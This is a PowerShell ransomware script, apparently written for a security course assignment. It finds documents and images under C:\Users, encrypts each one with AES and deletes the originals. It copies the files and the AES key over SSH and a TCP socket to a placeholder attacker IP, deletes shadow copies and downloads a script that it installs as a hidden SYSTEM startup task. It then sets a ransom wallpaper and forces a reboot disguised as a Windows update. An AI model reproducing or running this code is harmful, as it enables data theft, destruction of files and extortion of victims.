#Gets parameters for AES encryption ready
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

#Generates random AES key
function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

#Encryption and # I think unencryptedfilelocation can be removed
function Encrypt-String($files, $key, $unencryptedfilelocation) {
    foreach ($item in $list) {
        $bytes = [System.IO.File]::ReadAllBytes($item)
        $aesManaged = Create-AesManagedObject $key
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        $encMessage = [System.Convert]::ToBase64String($fullData)
        [System.IO.File]::WriteAllText($item + ".enyc", $encMessage)

        # Restart sshd
        Restart-Service OpenSSH*

        # SSH files over copy Windows's ssh pub-key
        cat $item | ssh  -o "StrictHostKeyChecking=no" -i $sshkey c0dexec@[attacker's IP] "cat > ~/Work/SPR708/A1/data-exfil/'$item'"
        Remove-Item -Path $item -Force -Confirm:$false
    }
    #List of backup of files
    cat $env:temp\$env:UserName.patch | ssh -o "StrictHostKeyChecking=no" -i $sshkey c0dexec@[attacker's IP] "cat > ~/Work/SPR708/A1/data-exfil/original-list/files-encrypted"
    Remove-Item -Path $env:temp\$env:UserName.patch -Force -Confirm:$false

    # Installs Pub Cert
    Invoke-WebRequest -Uri "http://[attacker's IP]/certs/certificate.crt" -UseBasicParsing -OutFile $RSAcert
    certutil -addstore -user -f "My" "$env:temp\certificate.crt"

    # Encrypts key and sends it over to Kali
    $plaintext = $aesManaged.IV + '`n' + $key
    $encryptedAES = Protect-CmsMessage -Content $plaintext -To $RSAcert
    (new-object System.Net.Sockets.TcpClient("[attacker's IP]", 8000)).GetStream().Write([System.Text.Encoding]::ASCII.GetBytes($encryptedAES), 0, [System.Text.Encoding]::ASCII.GetBytes($encryptedAES).Length)

    # Deletes shadown copies
    vssadmin delete shadows /all /quiet 
    
    # Download script and also adds it as a startup script. https://support.microsoft.com/en-us/windows/add-an-app-to-run-automatically-at-startup-in-windows-10-150da165-dcd9-7230-517b-cf3c295d89dd
    Invoke-WebRequest -Uri "http://[attacker's IP]/Encrypt.ps1" -UseBasicParsing -OutFile $update
    
    #Register-ScheduledJob -Name Windows-Update-Checker -ScheduledJobOption $Schedule -Trigger $Trigger -FilePath $update
    #Out-Null set /p="N" | schtasks /create /tn "My App" /tr 'powershell.exe -WindowStyle hidden -command "$update"' /RU SYSTEM /sc onstart 
    set /p="N" | Out-Null | schtasks /create /tn "My App" /tr 'powershell.exe -WindowStyle hidden -command "$update"' /RU SYSTEM /sc onstart

    # Set up wallpaper and give a warning.
    Invoke-WebRequest -Uri "http://[attacker's IP]/bg/bg.jpg" -UseBasicParsing -OutFile $env:Public\Pictures\bg.jpg
    Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name TileWallpaper -value "0"
    Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name WallpaperStyle -value "10" -Force
    Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name Wallpaper -value $env:Public\Pictures\bg.jpg
    shutdown /r /t 30 /c "Please save all of your documents Windows update is going to perform a restart in 30 seconds."
}

$param = "/timer:0 /nolicprompt /silent /accepteula"
$sshkey = "$env:Temp\update-pb"
$RSAcert = "$env:temp\certificate.crt"
$update = "$env:temp\Win-Update.ps1"
$pop = "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Please save all of your documents Windows update is going to perform a restart in 30 seconds.','Windows Update')}"
$Trigger = New-JobTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepeatIndefinitely
$Schedule = New-ScheduledJobOption -RunElevated -ContinueIfGoingOnBattery -StartIfOnBattery -RequireNetwork -HideInTaskScheduler -StartIfIdle 
$files = gci -Path 'C:\Users\*' -Recurse -Include *.txt, *.zip, *.7z, *.doc, *.docx, *.ppt, *.pptx, *.pdf, *.docm, *.jpg, *.png, *.xls, *.xlsx 2>$null | % { $_.FullName } > $env:temp\$env:UserName.patch
$key = Create-AesKey
$list = [System.IO.File]::ReadAllLines("$env:temp\$env:UserName.patch")

$encryptedString = Encrypt-String $files $key

$encryptedString